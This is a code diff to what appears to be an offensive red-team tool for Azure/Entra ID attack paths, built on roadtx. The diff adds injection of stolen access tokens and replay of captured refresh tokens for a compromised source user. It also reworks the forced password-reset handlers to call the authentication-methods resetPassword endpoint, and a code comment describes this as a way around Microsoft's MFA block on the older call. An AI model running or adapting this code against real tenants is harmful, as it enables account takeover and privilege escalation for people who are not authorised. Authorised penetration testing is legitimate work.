@@ -64,12 +64,21 @@ class AzureBaseHandler(BaseEdgeHandler):
         return f"{az.username}@{az.tenant_domain}" if az else None
 
     async def _user_token(self, edge: EdgeInfo) -> str | None:
-        """Delegated MS Graph token for the edge's **source user** (ROPC).
+        """Delegated MS Graph token for the edge's **source user**.
 
-        Password resolution order: ``-p source_password=``, then the config
-        credential when the source matches ``azure.username``, then a captured
-        password in the cred store (campaign chaining / vault). Placeholder
-        while emitting.
+        Token resolution order:
+          1. ``-p source_access_token=<jwt>`` — stolen/captured access token;
+             bypasses all auth logic and goes straight to Graph. This is the
+             realistic post-phish/post-compromise path (AiTM, token extraction
+             from a compromised device, pass-the-cookie, etc.).
+          2. ``-p source_auth_mode=refresh`` — redeem a pre-captured refresh
+             token from *source_token_file* (default ``.roadtools_auth``).
+             Models stolen refresh token or PRT-derived token replay.
+          3. Config ``auth_mode`` when the source matches ``azure.username``.
+          4. ROPC (default) — requires password via ``-p source_password=``,
+             the config credential when source == config user, or a captured
+             password in the cred store. Only valid when MFA is not enforced
+             for the operation by a Conditional Access policy.
         """
         az = self._azure_cfg()
         if az is None:
@@ -80,22 +89,32 @@ class AzureBaseHandler(BaseEdgeHandler):
                 )
             return None
 
+        # Direct token injection — stolen access token, no auth round-trip needed
+        stolen = edge.properties.get("source_access_token")
+        if stolen:
+            return stolen
+
         user = (self._source_upn(edge) or az.username).split("@")[0]
         pw = edge.properties.get("source_password")
+        token_file = edge.properties.get("source_token_file", ".roadtools_auth")
         mode = "ropc"
         if pw is None and user.lower() == az.username.split("@")[0].lower():
             pw, mode = az.password, az.auth_mode
-        if pw is None:
-            cred = self.cred_store.get_best_credential(user, az.tenant_domain)
-            if cred and cred.cred_type == CredentialType.password:
-                pw = cred.value
-        if pw is None and emitting():
-            pw = "<PASSWORD>"
-        if pw is None:
-            return None
+        # Explicit override wins — allows refresh mode for MFA-gated operations
+        mode = edge.properties.get("source_auth_mode", mode)
+        if mode == "ropc":
+            if pw is None:
+                cred = self.cred_store.get_best_credential(user, az.tenant_domain)
+                if cred and cred.cred_type == CredentialType.password:
+                    pw = cred.value
+            if pw is None and emitting():
+                pw = "<PASSWORD>"
+            if pw is None:
+                return None
         return await roadtx.get_graph_token(
             auth_mode=mode, username=user, password=pw, tenant=az.tenant_domain,
             client_id=az.client_id, roadtx_bin=az.roadtx_path,
+            token_file=token_file,
         )
 
     async def _grant_role(
@@ -371,8 +390,9 @@ class AZResetPasswordHandler(AzureBaseHandler):
     """AZResetPassword: a password-reset-capable principal (Helpdesk / Password /
     Authentication / User Administrator) resets a target user's password.
 
-    Graph: ``PATCH /users/{id}`` with a new passwordProfile. Irreversible
-    (original password unknown) so no rollback.
+    Graph: ``POST /users/{id}/authentication/methods/{pwdMethodId}/resetPassword``
+    with ``{"newPassword": "..."}`` — requires ``UserAuthenticationMethod.ReadWrite.All``.
+    Returns 202 Accepted (async). Irreversible (original password unknown) — no rollback.
     """
 
     @staticmethod
@@ -406,9 +426,14 @@ class AZResetPasswordHandler(AzureBaseHandler):
         if not token:
             return False, f"Failed to obtain Graph token for {edge.source.name}", []
 
+        # PATCH /users/{id}/passwordProfile is blocked by Microsoft's platform-level
+        # MFA requirement regardless of tenant CA policy config. Use the admin-reset
+        # path via the authentication methods API instead — requires
+        # UserAuthenticationMethod.ReadWrite.All and returns 202 Accepted.
+        _PWD_METHOD = "28c10230-6103-485e-b985-444c60001490"
         res = await roadtx.graph_request(
-            "PATCH", f"/users/{tgt}", token,
-            body={"passwordProfile": {"forceChangePasswordNextSignIn": False, "password": new_pw}},
+            "POST", f"/users/{tgt}/authentication/methods/{_PWD_METHOD}/resetPassword",
+            token, body={"newPassword": new_pw},
         )
         if not res.get("success"):
             return False, f"Password reset failed: {res.get('error', 'unknown')}", []
@@ -1175,8 +1200,9 @@ class AZPrivilegedAuthAdminHandler(AzureBaseHandler):
 
     Can reset passwords and authentication methods for most non-GA users.
     Exploits by resetting a specific target user's password.
-    Target user via ``-p target_user_id=<objectId>`` and
-    ``-p target_upn=<UPN>`` (for the Graph PATCH call).
+    Target user via ``-p target_user_id=<objectId>`` and ``-p target_upn=<UPN>``.
+    Graph: ``POST /users/{id}/authentication/methods/{pwdMethodId}/resetPassword``
+    — requires ``UserAuthenticationMethod.ReadWrite.All``. Returns 202 Accepted.
     """
 
     @staticmethod
@@ -1217,9 +1243,10 @@ class AZPrivilegedAuthAdminHandler(AzureBaseHandler):
         if not token:
             return False, f"Failed to obtain Graph token for {edge.source.name}", []
 
+        _PWD_METHOD = "28c10230-6103-485e-b985-444c60001490"
         res = await roadtx.graph_request(
-            "PATCH", f"/users/{uid}", token,
-            body={"passwordProfile": {"forceChangePasswordNextSignIn": False, "password": new_pw}},
+            "POST", f"/users/{uid}/authentication/methods/{_PWD_METHOD}/resetPassword",
+            token, body={"newPassword": new_pw},
         )
         if not res.get("success"):
             return False, f"Password reset failed: {res.get('error', 'unknown')}", []
